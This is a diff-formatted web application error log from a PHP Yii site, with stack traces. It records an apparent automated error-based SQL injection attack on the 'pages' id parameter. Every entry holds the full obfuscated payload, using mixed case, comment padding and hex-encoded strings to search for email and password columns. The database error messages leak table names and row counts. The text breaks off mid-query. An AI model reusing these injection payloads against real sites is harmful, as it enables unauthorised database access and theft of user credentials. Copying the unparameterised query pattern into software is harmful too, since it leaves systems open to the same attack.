@@ -1,0 +1,562 @@
+2019/04/30 13:17:03 [error] [system.db.CDbCommand] CDbCommand::fetch() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!unregister_user_query!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,t./**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25656d61696c25 and not t./**/tAbLe_nAmE in(0x6461696c795f76697369746f72735f7265706f7274,0x666f72676f745f70617373776f72645f7265717565737473,0x666f726d73686973746f7279,0x6d6b745f6461696c795f76697369746f72735f7265706f7274,0x7375626372697074696f6e) /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 5,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (748)
+in /home/rdlpk/public_html/index.php (13)
+2019/04/30 13:17:03 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!unregister_user_query!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,t./**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25656d61696c25 and not t./**/tAbLe_nAmE in(0x6461696c795f76697369746f72735f7265706f7274,0x666f72676f745f70617373776f72645f7265717565737473,0x666f726d73686973746f7279,0x6d6b745f6461696c795f76697369746f72735f7265706f7274,0x7375626372697074696f6e) /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 5,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(415): CDbCommand->queryInternal('fetch', Array, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(748): CDbCommand->queryRow()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionPages()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('pages')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/pages')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+and+not+t.%2f**%2ftAbLe_nAmE+in(0x6461696c795f76697369746f72735f7265706f7274,0x666f72676f745f70617373776f72645f7265717565737473,0x666f726d73686973746f7279,0x6d6b745f6461696c795f76697369746f72735f7265706f7274,0x7375626372697074696f6e)+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+5,1))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+and+not+t.%2f**%2ftAbLe_nAmE+in(0x6461696c795f76697369746f72735f7265706f7274,0x666f72676f745f70617373776f72645f7265717565737473,0x666f726d73686973746f7279,0x6d6b745f6461696c795f76697369746f72735f7265706f7274,0x7375626372697074696f6e)+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+5,1))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/04/30 13:17:04 [error] [system.db.CDbCommand] CDbCommand::fetch() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!475!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(*),0x217e21) /**/fRoM rdlpk_db1.unregister_user_query)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (748)
+in /home/rdlpk/public_html/index.php (13)
+2019/04/30 13:17:04 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!475!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(*),0x217e21) /**/fRoM rdlpk_db1.unregister_user_query)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(415): CDbCommand->queryInternal('fetch', Array, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(748): CDbCommand->queryRow()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionPages()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('pages')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/pages')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+rdlpk_db1.unregister_user_query))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+rdlpk_db1.unregister_user_query))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/04/30 13:17:06 [error] [system.db.CDbCommand] CDbCommand::fetch() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!user!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,t./**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25656d61696c25 and not t./**/tAbLe_nAmE in(0x6461696c795f76697369746f72735f7265706f7274,0x666f72676f745f70617373776f72645f7265717565737473,0x666f726d73686973746f7279,0x6d6b745f6461696c795f76697369746f72735f7265706f7274,0x7375626372697074696f6e,0x756e72656769737465725f757365725f7175657279) /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 6,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (748)
+in /home/rdlpk/public_html/index.php (13)
+2019/04/30 13:17:06 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!user!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,t./**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25656d61696c25 and not t./**/tAbLe_nAmE in(0x6461696c795f76697369746f72735f7265706f7274,0x666f72676f745f70617373776f72645f7265717565737473,0x666f726d73686973746f7279,0x6d6b745f6461696c795f76697369746f72735f7265706f7274,0x7375626372697074696f6e,0x756e72656769737465725f757365725f7175657279) /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 6,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(415): CDbCommand->queryInternal('fetch', Array, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(748): CDbCommand->queryRow()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionPages()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('pages')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/pages')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+and+not+t.%2f**%2ftAbLe_nAmE+in(0x6461696c795f76697369746f72735f7265706f7274,0x666f72676f745f70617373776f72645f7265717565737473,0x666f726d73686973746f7279,0x6d6b745f6461696c795f76697369746f72735f7265706f7274,0x7375626372697074696f6e,0x756e72656769737465725f757365725f7175657279)+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+6,1))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+and+not+t.%2f**%2ftAbLe_nAmE+in(0x6461696c795f76697369746f72735f7265706f7274,0x666f72676f745f70617373776f72645f7265717565737473,0x666f726d73686973746f7279,0x6d6b745f6461696c795f76697369746f72735f7265706f7274,0x7375626372697074696f6e,0x756e72656769737465725f757365725f7175657279)+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+6,1))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/04/30 13:17:07 [error] [system.db.CDbCommand] CDbCommand::fetch() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!88!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(*),0x217e21) /**/fRoM rdlpk_db1.user)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (748)
+in /home/rdlpk/public_html/index.php (13)
+2019/04/30 13:17:07 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!88!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(*),0x217e21) /**/fRoM rdlpk_db1.user)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(415): CDbCommand->queryInternal('fetch', Array, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(748): CDbCommand->queryRow()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionPages()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('pages')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/pages')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+rdlpk_db1.user))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+rdlpk_db1.user))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/04/30 13:17:10 [error] [system.db.CDbCommand] CDbCommand::fetch() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2570617373776f726425)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (748)
+in /home/rdlpk/public_html/index.php (13)
+2019/04/30 13:17:10 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2570617373776f726425)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(415): CDbCommand->queryInternal('fetch', Array, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(748): CDbCommand->queryRow()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionPages()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('pages')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/pages')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(t.%2f**%2ftAbLe_nAmE),0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/pages?id=9'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(t.%2f**%2ftAbLe_nAmE),0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/04/30 13:17:11 [error] [system.db.CDbCommand] CDbCommand::fetch() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!rdlpk_db1!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from pages where id='9' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,d./**/sChEmA_NaMe,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2570617373776f726425 /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x 